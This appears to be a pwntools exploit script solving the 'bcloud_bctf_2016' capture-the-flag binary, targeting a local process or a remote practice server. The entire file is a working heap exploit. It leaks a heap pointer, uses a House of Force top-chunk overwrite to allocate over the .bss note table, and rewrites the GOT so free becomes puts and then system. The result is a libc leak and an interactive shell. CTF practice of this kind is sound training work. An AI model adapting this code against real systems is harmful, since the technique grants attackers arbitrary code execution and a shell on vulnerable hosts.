import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./bcloud_bctf_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./bcloud_bctf_2016')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27821)
			elf=ELF('./bcloud_bctf_2016')
			libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so')

		def add(a,b):
			io.sendlineafter('option--->>\n','1')
			io.sendlineafter('Input the length of the note content:\n',str(a))
			io.sendafter('content:\n',b)

		def delete(a):
			io.sendlineafter('option--->>\n','4')
			io.sendlineafter('Input the id:\n',str(a))

		def edit(a,c):
			io.sendlineafter('option--->>\n','3')
			io.sendlineafter('Input the id:\n',str(a))
			io.sendafter('content:\n',c)

		def leak_heap():
			global leak

			io.sendafter("name:\n", "A" * 0x40)
			leak = u32(io.recvuntil('! Welcome', drop=True)[-4:])
			log.info("leak heap address: 0x%x" % leak)

		def define(a,b):
			io.sendafter('Org:\n',a)
			io.sendafter('Host:\n',b)

		bss_addr=0x804b088

		leak_heap()
		define('b'*0x40,p32(0xffffffff)+'\n')
		add(bss_addr-(leak+0xd0)-4,'aaaa\n')
		add(0xf0,'/bin/sh\x00'+p32(0x100)+p32(4)+p32(4)+p32(4)+'\x00'*0x70+p32(bss_addr+0x10)+p32(elf.got['free'])+p32(elf.got['puts'])+p32(elf.got['free'])+'\n')
		edit(1,p32(elf.sym['puts']))
		delete(2)
		libc_base=u32(io.recv(4))-libc.sym['puts']
		libc.address=libc_base
		edit(3,p32(libc.sym['system']))
		delete(0)

		


		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue